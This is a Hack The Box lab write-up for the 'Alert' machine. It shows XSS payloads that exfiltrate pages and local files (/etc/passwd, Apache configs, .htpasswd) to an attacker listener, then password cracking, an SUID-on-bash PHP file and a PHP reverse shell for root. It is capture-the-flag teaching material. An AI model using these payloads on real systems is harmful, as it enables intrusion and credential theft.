---
date: 2025-03-21T23:31:12-05:00
# description: ""
image: "/images/HTB-Alert/Alert.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Alert"
type: "post"
---

* Platform: Hack The Box
* Link: [Alert](https://app.hackthebox.com/machines/Alert)
* Level: Easy
* OS: Linux
---

The exploitation of Alert begins with the discovery of two XSS vulnerabilities, one of which exposes a Local File Inclusion (LFI) flaw. Leveraging this, we extract the contents of the `.htpasswd` file, revealing a hashed user password. After cracking the hash, we obtain valid credentials and gain an initial foothold on the target. Further system enumeration reveals an internally hosted website. We then identify the write permission to a critical directory, enabling us to access root account.

Target IP address - `10.10.11.44`

## Scanning

```
nmap -sC -sV -Pn -p- -oA nmap/Alert {TARGET_IP}
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-04 11:38 CST
Nmap scan report for 10.10.11.44
Host is up (0.054s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)

80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://alert.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)

12227/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.16 seconds
```

We have two open ports:
- 22 with SSH
- 80 with http and a redirection to `alert.htb`

```
sudo echo "{TARGET_IP} alert.htb" | sudo tee -a /etc/hosts
```

## Enumeration

At `http://alert.htb/` we find a markdown viewer. 

![Alert maekdown viewer](/images/HTB-Alert/alert_website.png)

We upload a file and view it. There is also a `Share Markdown` button.

![Share Markdown button](/images/HTB-Alert/view_md.png)

We also have a few other pages: `Contac Us`, `About Us`, and `Donate`.

The `View Markdown` Button sends a POST request to `/visualizer.php`.

![visualizer.php request](/images/HTB-Alert/visualizer.png)

The `Share Markdown` option sends a GET request to `/visualizer.php?link_share=xxxx.xxxx.md`.

![Share Markdown request](/images/HTB-Alert/visualizer_share.png)

The button on the contact page sends a POST request to `contact.php` and uses two paraneters `email` and `message`.

![Contact page request](/images/HTB-Alert/alert_contact.png)

Finally the Donate page sends a POST request to `/index.php?page=donate`.

![Donate page request](/images/HTB-Alert/alert_donate.png)

We run gobuster for some directory brute forcing and find a few results

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://alert.htb/
```

![Directory brute forcing](/images/HTB-Alert/alert_gobuster.png)

All the directories found are inaccessible.

* `http://alert.htb/uploads/`

![uploads directory](/images/HTB-Alert/uploads_dir.png)

* `http://alert.htb/messages/`

![messages directory](/images/HTB-Alert/msg_dir.png)

* `http://alert.htb/server-status/`

![server_status directory](/images/HTB-Alert/server_status.png)

Using ffuf we discover a subdomain: `statistics`.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://alert.htb -H "Host: FUZZ.alert.htb" -ic -fc 301
```

![Subdomain enumeration](/images/HTB-Alert/alert_ffuf.png)

At `http://statistics.alert.htb/` we find a login page requiring a `username` and `password`.

![statistics subdomain login page](/images/HTB-Alert/statistics_subdomain.png)

`Basic Authentication` is used for the user authentication. This simple authentication method is not secure on its own because the credentials are only Base64-encoded, not encrypted.

![Basic authentication](/images/HTB-Alert/basic_auth.png)

We go back to the markdown viewer. Let's add a XSS payload to our markdown file and try to view it.

```
<script>alert(1)</script>
```

![XSS test](/images/HTB-Alert/xss_md.png)

When we view the markdown file our XSS payload gets executed!

![XSS payload triggered](/images/HTB-Alert/alert_xss_payload.png)

It also works when we share the file.

![XSS payload triggered 2](/images/HTB-Alert/alert_xss_payload1.png)

We can also test for a XSS vulnerability on the contact page.

```
<img src=x error= \"fetch('http://IP:PORT/?kscorpio')\"
```

![XSS test on contact page](/images/HTB-Alert/test_XSS.png)

Our payload works here too.

![XSS on contact page success](/images/HTB-Alert/XSS_test_success.png)

## Initial Foothold

We have confirmed two instances of XSS. Let's update the content of our markdown file and try to steal some sensitive data.

```javascript
<script>
fetch("http://alert.htb/")
    .then(response => response.text())
    .then(data => {
    fetch("http://IP:PORT/?data=" + encodeURIComponent(data));
    })
    .catch(error => console.error("Error fetching messages:", error));
</script>
```

Even though nothing is displayed when we view our file, checking the page's source code confirms it is included in the page.

![page source code](/images/HTB-Alert/script_included.png)

We use the link we obtain with the `Share Markdown` button at `/contact`.

![xss payload in contact page](/images/HTB-Alert/XSS_contact.png)

After sending the message we receive a response on our web server.

We decode the URL-encoded response in Burp. Its content is the html file of the home page.

![home page source code](/images/HTB-Alert/HTML_alert.png)

Once again we modify the content of our markdown file. This time we will try to access `/messages`. We use the link such as `http://alert.htb/visualizer.php?link_share=xxxxxx.xxxxxx.md` on the contact page.

If the user triggering our payload has higher privileges we might be able to see the content of `/messages`.

```Javascript
<script>
fetch("http://alert.htb/messages.php")
    .then(response => response.text())
    .then(data => {
    fetch("http://IP:PORT/?data=" + encodeURIComponent(data));
    })
    .catch(error => console.error("Error fetching messages:", error));
</script>
```

On the web server we receive a response, which we decode.

### Local File Inclusion

Using Burp decoder we notice that the response is using a `file` parameter at `messages.php`.

![file parameter at messages.php](/images/HTB-Alert/file_param.png)

Let's try leveraging it for an LFI vulnerability.

```javascript
<script>
fetch("http://alert.htb/messages.php?file=../../../../../etc/passwd")
    .then(response => response.text())
    .then(data => {
    fetch("http://IP:PORT/?data=" + encodeURIComponent(data));
    })
    .catch(error => console.error("Error fetching messages:", error));
</script>
```

After decoding the response we see that the LFI works! We find two users `albert` and `david`.

![XSS to LFI](/images/HTB-Alert/XSS_LFI.png)

We remember that `Basic Authentication` is used at `http://statistics.alert.htb/`. Now that we have a working LFI we can try to read the `.htpasswd` file.

> The `.htpasswd` file in Apache stores usernames and encrypted passwords for basic HTTP authentication.

To find its location we will read the configuration file of Apache. The most common paths are `/etc/apache2/apache2.conf` and `/etc/apache2/sites-available/000-default.conf`.

> `apache2.conf` is the main configuration file while `000-default.conf` is the file defining virtual host configuration.

```javascript
<script>
fetch("http://alert.htb/messages.php?file=../../../../../etc/apache2/apache2.conf")
    .then(response => response.text())
    .then(data => {
    fetch("http://IP:PORT/?data=" + encodeURIComponent(data));
    })
    .catch(error => console.error("Error fetching messages:", error));
</script>
```

We read the content of `apache2.conf` but it does not mention `.htpasswd` in a relevant manner.

![Apache2.conf file](/images/HTB-Alert/apache2.png)

On the other hand `000-default.conf` reveals the location of `.htpasswd` which is `/var/www/statistics.alert.htb/.htpasswd`.

```javascript
<script>
fetch("http://alert.htb/messages.php?file=../../../../../etc/apache2/sites-available/000-default.conf")
    .then(response => response.text())
    .then(data => {
    fetch("http://IP:PORT/?data=" + encodeURIComponent(data));
    })
    .catch(error => console.error("Error fetching messages:", error));
</script>
```

![000-default.conf file](/images/HTB-Alert/000-default.png)

So now we read the file.

```javascript
<script>
fetch("http://alert.htb/messages.php?file=../../../../../var/www/statistics.alert.htb/.htpasswd")
    .then(response => response.text())
    .then(data => {
    fetch("http://10.10.15.91:8000/?data=" + encodeURIComponent(data));
    })
    .catch(error => console.error("Error fetching messages:", error));
</script>
```

### Shell as albert

After decoding the response we recover `albert` password hash.

![albert password hash](/images/HTB-Alert/albert_pwd.png)

This is an Apache hash, crackable with hashcat mode `1600`.

```
hashcat -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
```

We recover the password `manchesterunited`.

![albert password](/images/HTB-Alert/albert_pass.png)

---

The credentials `albert:manchesterunited` work at `http://statistics.alert.htb/` but the page only displays data about donors.

![Alert Dashboard](/images/HTB-Alert/donors_info.png)

---

We login via SSH with those credentials and find the user flag.

![Foothold & user flag](/images/HTB-Alert/user_flag.png)

## Privilege Escalation

With the `id` command we discover that `albert` is part of a group called `management`. Looking for files related to the group we find some files suggesting a tool or application for monitoring websites.

![Files related to management group](/images/HTB-Alert/management_files.png)

Inside `/opt/website-monitor/` we find more files solidifying our theory of a web-based monitoring application.

![Website monitor files](/images/HTB-Alert/website_monitor_files.png)

With `ps aux` we see that the `root` user is running the web application on port `8080`.

![Internal website on port 8080](/images/HTB-Alert/root_ps_8080.png)

### Local Exploit

Because `albert` is part of the `management` group he has the permissions to write files into `/opt/website-monitor/config/`. So we can abuse it to gain a shell as root by setting the SUID bit on `/bin/bash`.

```PHP
<?php exec("chmod +s /bin/bash"); ?>
```

```
curl 127.0.0.1:8080/config/revshell.php

bash -p
```

![SUID bit set to bash binary](/images/HTB-Alert/SUID_root.png)

### Reverse Shell via the browser

We can also execute a PHP reverse shell file. However we will need to set up a tunnel first.

```
ssh -L {PORT}:localhost:8080 albert@IP
```

We indeed access a monitoring application at `http://localhost:{PORT}/`.

![Access to internal website](/images/HTB-Alert/website_monitor_website.png)

We navigate to `http://localhost:{PORT}/config/revshell.php` to execute our malicious file.

> I used the `PHP Ivan Sineck` shell on [revshells.com](https://www.revshells.com/).

![php reverse shell](/images/HTB-Alert/php_revshell_file.png)

We receive a root shell on our netcat listner.

![root flag](/images/HTB-Alert/revshell_root.png)



